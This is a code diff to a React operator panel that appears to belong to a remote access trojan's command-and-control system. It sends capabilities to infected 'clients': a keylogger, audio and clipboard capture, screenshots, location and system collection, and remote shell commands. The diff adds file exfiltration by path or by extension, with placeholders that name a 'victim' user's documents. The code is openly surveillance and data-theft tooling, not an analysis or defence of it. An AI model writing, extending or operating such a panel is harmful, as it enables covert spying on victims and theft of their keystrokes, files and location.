@@ -1,14 +1,17 @@
 import React, { useState, useEffect } from 'react';
 import { api } from '../api';
 
-const CAPABILITIES = {
-  1: { name: 'Audio Recorder', needsArgs: false, hint: 'Records audio from the client' },
-  2: { name: 'Clipboard Monitor', needsArgs: false, hint: 'Captures clipboard content' },
-  3: { name: 'Keylogger', needsArgs: false, hint: 'Logs keystrokes' },
-  4: { name: 'Screenshot', needsArgs: false, hint: 'Takes a screenshot' },
-  5: { name: 'Info Collector', needsArgs: false, hint: 'Collects system information' },
-  6: { name: 'Command Executor', needsArgs: true, hint: 'Executes a shell command', placeholder: 'cmd.exe /c whoami' },
-  7: { name: 'Location Collector', needsArgs: false, hint: 'Collects location data' }
+// Enhanced capability metadata
+const CAPABILITY_METADATA = {
+  1: { needsArgs: false, hint: 'Records audio from the client' },
+  2: { needsArgs: false, hint: 'Captures clipboard content' },
+  3: { needsArgs: false, hint: 'Logs keystrokes' },
+  4: { needsArgs: false, hint: 'Takes a screenshot' },
+  5: { needsArgs: false, hint: 'Collects system information' },
+  6: { needsArgs: true, hint: 'Executes a shell command', placeholder: 'cmd.exe /c whoami' },
+  7: { needsArgs: false, hint: 'Collects location data' },
+  8: { needsArgs: true, hint: 'Exfiltrates a single file', placeholder: 'C:\\Users\\victim\\Documents\\secret.pdf' },
+  9: { needsArgs: true, hint: 'Exfiltrates files by extension from directory', placeholder: '.pdf,.docx,.txt or C:\\path|.pdf,.docx' }
 };
 
 function Commands() {
@@ -18,10 +21,24 @@ function Commands() {
   const [args, setArgs] = useState('');
   const [message, setMessage] = useState(null);
   const [sending, setSending] = useState(false);
+  const [capabilities, setCapabilities] = useState({});
+  const [loading, setLoading] = useState(true);
 
   useEffect(() => {
     fetchClients();
+    fetchCapabilities();
   }, []);
+
+  const fetchCapabilities = async () => {
+    try {
+      const caps = await api.getCapabilities();
+      setCapabilities(caps);
+      setLoading(false);
+    } catch (error) {
+      console.error('Error fetching capabilities:', error);
+      setLoading(false);
+    }
+  };
 
   const fetchClients = async () => {
     try {
@@ -40,8 +57,8 @@ function Commands() {
       return;
     }
 
-    const capability = CAPABILITIES[selectedCapability];
-    if (capability.needsArgs && !args.trim()) {
+    const capabilityMeta = CAPABILITY_METADATA[selectedCapability];
+    if (capabilityMeta && capabilityMeta.needsArgs && !args.trim()) {
       setMessage({ type: 'error', text: 'This capability requires arguments' });
       return;
     }
@@ -51,9 +68,10 @@ function Commands() {
 
     try {
       await api.sendCommand(selectedClient, parseInt(selectedCapability), args);
+      const capabilityName = capabilities[selectedCapability] || `Capability ${selectedCapability}`;
       setMessage({ 
         type: 'success', 
-        text: `✓ Command sent: ${capability.name}` 
+        text: `✓ Command sent: ${capabilityName}` 
       });
       setArgs('');
       setTimeout(() => setMessage(null), 5000);
@@ -67,7 +85,11 @@ function Commands() {
     }
   };
 
-  const capability = CAPABILITIES[selectedCapability];
+  const capabilityMeta = CAPABILITY_METADATA[selectedCapability] || { needsArgs: false, hint: '' };
+
+  if (loading) {
+    return <div className="loading">Loading capabilities...</div>;
+  }
 
   return (
     <div>
@@ -104,23 +126,26 @@ function Commands() {
               onChange={(e) => setSelectedCapability(e.target.value)}
               required
             >
-              {Object.entries(CAPABILITIES).map(([id, cap]) => (
-                <option key={id} value={id}>
-                  {cap.name}
-                </option>
-              ))}
+              {Object.entries(capabilities)
+                .filter(([id]) => id !== '0')
+                .sort((a, b) => parseInt(a[0]) - parseInt(b[0]))
+                .map(([id, name]) => (
+                  <option key={id} value={id}>
+                    {id}. {name}
+                  </option>
+                ))}
             </select>
-            <small>{capability.hint}</small>
+            <small>{capabilityMeta.hint}</small>
           </div>
 
-          {capability.needsArgs && (
+          {capabilityMeta.needsArgs && (
             <div className="form-group">
               <label>Command Arguments</label>
               <input
                 type="text"
                 value={args}
                 onChange={(e) => setArgs(e.target.value)}
-                placeholder={capability.placeholder}
+                placeholder={capabilityMeta.placeholder || 'Enter arguments'}
                 required
               />
             </div>
@@ -135,11 +160,17 @@ function Commands() {
       <div className="card">
         <h2>Available Capabilities</h2>
         <div className="info-block">
-          {Object.entries(CAPABILITIES).map(([id, cap]) => (
-            <div key={id}>
-              <strong>{id}.</strong> {cap.name} - {cap.hint}
-            </div>
-          ))}
+          {Object.entries(capabilities)
+            .filter(([id]) => id !== '0')
+            .sort((a, b) => parseInt(a[0]) - parseInt(b[0]))
+            .map(([id, name]) => {
+              const meta = CAPABILITY_METADATA[id] || {};
+              return (
+                <div key={id}>
+                  <strong>{id}.</strong> {name} {meta.hint && `- ${meta.hint}`}
+                </div>
+              );
+            })}
         </div>
       </div>
     </div>
